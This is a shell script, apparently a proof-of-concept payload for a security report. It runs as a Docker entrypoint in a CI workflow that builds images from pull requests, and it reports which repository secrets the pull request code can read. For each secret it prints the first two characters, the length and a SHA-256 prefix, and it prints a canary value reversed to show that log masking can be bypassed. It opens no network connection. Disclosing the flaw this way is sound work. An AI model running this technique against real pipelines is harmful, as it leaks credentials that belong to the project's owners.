#!/bin/sh
# EH-15403 test payload.
#
# The "Recipe Security Scan" workflow builds recipe-scanner/Dockerfile from the
# pull request and starts the resulting image with repository secrets in its
# environment. This script is the entrypoint of that image.
#
# Safe by design:
#   - it never prints a whole secret value, and stores or sends nothing
#   - it opens no network connection and writes no file
#   - per secret it reports only: set or not, length, the first 2 characters
#     (skipped for values shorter than 8 characters) and the first 8 hex
#     characters of its SHA-256, so the owner can confirm it is the real value
#   - the one exception is a dummy value that starts with "CANARY-" (created
#     by the tester for the optional step). That value is also printed
#     reversed, to show that log masking would not stop a real attacker.
set -u

TAG='[EH-15403 test]'
NAMES='OPENAI_API_KEY TRAINING_DATA_LOW TRAINING_DATA_MEDIUM TRAINING_DATA_EXTREME'

sha8() {
  if command -v sha256sum >/dev/null 2>&1; then
    printf '%s' "$1" | sha256sum | cut -c1-8
  else
    printf '%s' "$1" | shasum -a 256 | cut -c1-8
  fi
}

first2() {
  # first 2 characters only, and only for values of 8 characters or more
  if [ "${#1}" -lt 8 ]; then
    printf '%s' '(too short, not shown)'
    return
  fi
  printf '%s' "${1%"${1#??}"}" | LC_ALL=C tr -c '[:print:]' '?'
}

reverse() {
  s=$1
  out=''
  while [ -n "$s" ]; do
    rest=${s#?}
    out="${s%"$rest"}$out"
    s=$rest
  done
  printf '%s' "$out"
}

echo "$TAG ------------------------------------------------------------"
echo "$TAG RUN: this container was built from the pull request's own"
echo "$TAG recipe-scanner/Dockerfile and started by the workflow with"
echo "$TAG repository secrets passed in as environment variables."
echo "$TAG Only the first 2 characters of each secret are printed."
echo "$TAG Nothing is stored or sent anywhere."
echo "$TAG ------------------------------------------------------------"

readable=0
total=0
for name in $NAMES; do
  total=$((total + 1))
  eval "val=\${$name-}"
  if [ -z "$val" ]; then
    echo "$TAG $name: not set"
    continue
  fi
  readable=$((readable + 1))
  case "$val" in
    CANARY-*)
      echo "$TAG $name: READABLE (dummy canary) first2=$(first2 "$val") length=${#val} sha256[0:8]=$(sha8 "$val") reversed=$(reverse "$val")"
      ;;
    *)
      echo "$TAG $name: READABLE first2=$(first2 "$val") length=${#val} sha256[0:8]=$(sha8 "$val")"
      ;;
  esac
done
unset val

echo "$TAG result: $readable of $total secrets were readable by pull request code"
exit 0
